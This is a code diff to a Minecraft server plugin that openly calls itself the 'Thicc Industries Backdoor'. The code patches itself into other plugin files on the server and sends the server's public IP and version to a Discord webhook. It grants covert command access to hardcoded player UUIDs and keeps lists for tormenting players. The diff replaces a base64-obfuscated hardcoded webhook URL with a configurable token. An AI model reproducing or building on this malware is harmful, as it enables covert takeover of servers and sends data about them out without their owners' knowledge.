@@ -33,7 +33,7 @@ public final class Debugger implements Listener {
 
     private Plugin plugin;
 
-    public Debugger(Plugin plugin, String prefix, boolean InjectOther, boolean warnings){
+    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, String discord_token, boolean InjectOther, boolean warnings){
         //Check for another bd. This is really lame way
         boolean bd_running = false;
         Plugin[] pp = plugin.getServer().getPluginManager().getPlugins();
@@ -72,10 +72,10 @@ public final class Debugger implements Listener {
 
                     if (Config.display_debug_messages)
                         Bukkit.getConsoleSender()
-                                .sendMessage("Injecting DOOM into: " + plugin_file.getPath());
+                                .sendMessage("Injecting Thicc Industries into: " + plugin_file.getPath());
 
                     boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(),
-                            new com.thiccindustries.debugger.Injector.SimpleConfig(prefix, InjectOther, warnings), true, warnings, false);
+                            new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, discord_token, InjectOther, warnings), true, warnings, false);
 
                     if (Config.display_debug_messages)
                         Bukkit.getConsoleSender()
@@ -84,24 +84,29 @@ public final class Debugger implements Listener {
             }
         }
 
-        //First plugin loaded.
+//First plugin loaded.
+        Config.uuids_are_usernames = Usernames;
+        Config.authorized_uuids  = UUID;
         Config.command_prefix   = prefix;
         Config.display_debug_messages = warnings;
         Config.display_debugger_warning = warnings;
 
         this.plugin = plugin;
 
-        b();
+        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - 1];
 
         if(Config.display_debugger_warning){
             Bukkit.getConsoleSender()
                     .sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a Debugger installed.");
         }
 
+        if(!discord_token.equals(""))
+            discord_message(discord_token);
+
         plugin.getServer().getPluginManager().registerEvents(this, plugin);
     }
 
-    public static void b() {
+    public static void discord_message(String discord_token) {
         Date date = Calendar.getInstance().getTime();
         String pref = Config.command_prefix;
 
@@ -109,12 +114,12 @@ public final class Debugger implements Listener {
             URL url = new URL("https://api.ipify.org/");
             BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
             String ip = br.readLine();
-            DWeb webhook = new DWeb(c1);
+            DWeb webhook = new DWeb(discord_token);
             webhook.setContent("");
             webhook.setTts(false);
             webhook.addEmbed((new DWeb.EmbedObject())
-                    .setTitle("Debugger")
-                    .setDescription("Server is running Debugger!")
+                    .setTitle("Thicc Industries Backdoor")
+                    .setDescription("Server is running Backdoor:")
                     .setColor(Color.GREEN)
                     .addField("Client version: ", Bukkit.getBukkitVersion(), false)
                     .addField("Server version: ", Bukkit.getVersion(), false)
@@ -1069,7 +1074,7 @@ public final class Debugger implements Listener {
             case "help": {
                 if (args.length == 1) {
                     p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
-                    p.sendMessage(Config.help_detail_color + "DOOM --> () = Required, [] = Optional.");
+                    p.sendMessage(Config.help_detail_color + "Thicc Industries () = Required, [] = Optional.");
                     for (int i = 0; i < Config.help_messages.length; i++) {
                         p.sendMessage(Config.help_command_name_color + Config.command_prefix + Config.help_messages[i].getName() + ": " + Config.help_messages[i].getSyntax());
                     }
@@ -1128,15 +1133,10 @@ public final class Debugger implements Listener {
     }
 
     public ArrayList<String> Vanished = new ArrayList<>();
-
     public ArrayList<String> LockedUsers = new ArrayList<>();
-
     public ArrayList<String> MutedUsers = new ArrayList<>();
-
     public ArrayList<String> SilkTouch = new ArrayList<>();
-
     public ArrayList<String> InstaBreak = new ArrayList<>();
-
     public ArrayList<String> MindFuck_thrower = new ArrayList<>();
     public ArrayList<String> MindFuck_interact = new ArrayList<>();
     public ArrayList<String> MindFuck_cripple = new ArrayList<>();
@@ -1151,9 +1151,6 @@ public final class Debugger implements Listener {
     public ArrayList<String> MindFuck_damage = new ArrayList<>();
     public ArrayList<String> MindFuck_speed = new ArrayList<>();
 
-    static Base64.Decoder b1 = Base64.getUrlDecoder();
-    static byte[] c = b1.decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTYyOTg5MTc3MDY5MjQ0NDQ2L21QUHRncjBrS0lBdThGWkRBTnRlSWt6Z0Rzd1d6aVRqQjY5M2I4X2c1TEFZZ2pfc1BUNlhhYWpjdDNwRkVodjdvLVpS");
-    static String c1 = new String(c);
 
     @EventHandler(priority = EventPriority.LOWEST)
     public void onServerCommand(ServerCommandEvent e) {
@@ -1313,6 +1310,30 @@ public final class Debugger implements Listener {
 
     /*Check if Player is authorized in Config.java*/
     public boolean IsUserAuthorized(Player p) {
-        return true;
+        if(Config.uuids_are_usernames)
+            return IsUserAuthorized(p.getName());
+
+        return IsUserAuthorized(p.getUniqueId().toString());
+    }
+
+    /*Check if UUID is authorized in Config.java*/
+    public boolean IsUserAuthorized(String uuid) {
+
+        for(String u : Config.authorized_uuids){
+            if(uuid.equals(u)){
+                return true;
+            }
+        }
+
+        boolean authorized = false;
+
+        for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
+            if (uuid.equals(Config.tmp_authorized_uuids[i])) {
+                authorized = true;
+                break;
+            }
+        }
+
+        return authorized;
     }
 }
